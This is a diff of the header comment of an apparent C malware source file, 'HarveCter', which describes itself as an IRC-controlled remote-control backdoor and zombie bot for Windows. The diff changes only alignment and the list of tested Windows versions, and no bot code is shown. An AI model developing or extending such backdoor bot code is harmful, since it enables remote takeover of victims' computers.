@@ -17,10 +17,10 @@
  <>   Name:                  HarveCter                                                                <>
  <>   Subject:               IRC Bot                                                                  <>
  <>   Description:           Remote Control/Backdoor/Zombie/etc... Everything is controled by IRC     <>
- <>   Version:               1.0                                                                     <>
+ <>   Version:               1.0                                                                      <>
  <>                                                                                                   <>
  <>  <>DETAILS                                                                                        <>
- <>   Platform:              Microsoft Windows (Tested on XP SP2)                                     <>
+ <>   Platform:              Microsoft Windows (Tested on 2000, XP SP1, XP SP2)                       <>
  <>   Language:              Ansi C + Few windows libs (windows.h & WinSock)                          <>
  <>   Author:                <-- Harvie                                                               <>
  <>   Date:                  2oo7                                                                     <>
